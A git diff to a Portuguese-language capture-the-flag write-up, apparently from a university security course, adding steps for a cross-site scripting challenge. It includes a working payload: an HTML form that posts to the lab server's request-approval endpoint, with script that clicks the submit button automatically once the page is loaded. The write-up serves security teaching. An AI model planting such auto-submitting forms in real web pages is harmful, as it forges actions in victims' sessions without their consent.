@@ -12,6 +12,14 @@ Obtendo este resultado:
 
 ![Alt text](image-5.png)
 
-![testXSS](images/ctf4/testXSS.png)
+A seguir, colocamos este script...
 
-![successXSS](images/ctf4/success.png)
+```
+<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/%7Binserir ID do pedido}/approve" role="form"><div class="submit">  <input type="submit" id="giveflag" value="Give the flag"></div></form><script>document.getElementById("giveflag").click();</script>
+```
+
+...no input da página e submetemos assim.
+
+O resultado que nos dará será este:
+
+
